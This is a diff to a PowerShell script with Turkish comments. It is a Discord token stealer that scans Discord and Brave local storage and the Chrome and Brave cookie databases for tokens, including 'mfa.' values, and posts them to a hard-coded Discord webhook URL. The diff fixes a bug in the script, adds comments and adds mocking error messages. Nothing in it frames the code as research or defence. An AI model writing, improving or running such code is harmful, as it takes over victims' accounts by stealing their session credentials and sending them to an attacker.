@@ -1,7 +1,7 @@
-# sqlite3.exe yolunu ayarla (projende varsa bu şekilde)
+# sqlite3.exe dosyasının yolu (aynı dizinde olduğunu varsayıyoruz)
 $sqliteExe = ".\sqlite3.exe"
 
-# LevelDB ve Cookie dosya yolları
+# Tarama yapılacak LevelDB dizinleri
 $paths = @(
     "$env:APPDATA\discord\Local Storage\leveldb",
     "$env:APPDATA\discordcanary\Local Storage\leveldb",
@@ -10,6 +10,7 @@ $paths = @(
     "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
 )
 
+# Tarama yapılacak Cookie veritabanları (SQLite)
 $cookiePaths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
     "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
@@ -40,10 +41,11 @@ function Get-TokensFromLevelDB {
 
 function Get-TokensFromSQLite {
     param ($dbPath)
-    if (Test-Path $dbPath -and (Test-Path $sqliteExe)) {
+    if ((Test-Path $dbPath) -and (Test-Path $sqliteExe)) {
         try {
             $tempDb = "$env:TEMP\cookies_temp.db"
             Copy-Item -Path $dbPath -Destination $tempDb -Force
+
             $query = "SELECT name, value FROM cookies WHERE name LIKE '%token%' OR value LIKE '%mfa.%';"
             $output = & $sqliteExe $tempDb "$query" 2>$null
 
@@ -61,22 +63,23 @@ function Get-TokensFromSQLite {
                     }
                 }
             }
+
             Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
         } catch {}
     }
 }
 
-# LevelDB tara
+# LevelDB'den tokenleri topla
 foreach ($path in $paths) {
     Get-TokensFromLevelDB -path $path
 }
 
-# Cookie SQLite tara
+# Cookie veritabanından tokenleri topla
 foreach ($cookiePath in $cookiePaths) {
     Get-TokensFromSQLite -dbPath $cookiePath
 }
 
-# Token varsa webhooka yolla
+# Token bulunduysa webhooka gönder
 if ($tokens.Count -gt 0) {
     $joinedTokens = ($tokens -join ",")
     $body = @{
@@ -85,7 +88,9 @@ if ($tokens.Count -gt 0) {
 
     try {
         Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1382366500777754786/sjFYA4Lh_9oTWZXM4L_ehRA7RagtJKDwxQ23xZT8-cUTYyQErTZWp-e977lclWd6PQX9" -Method Post -Body $body -ContentType "application/json"
-    } catch {}
+    } catch {
+        Write-Host "Webhook başarısız oldu, beceremedin beyin." -ForegroundColor Red
+    }
 } else {
     Write-Host "Token bulunamadı, mal." -ForegroundColor Red
 }
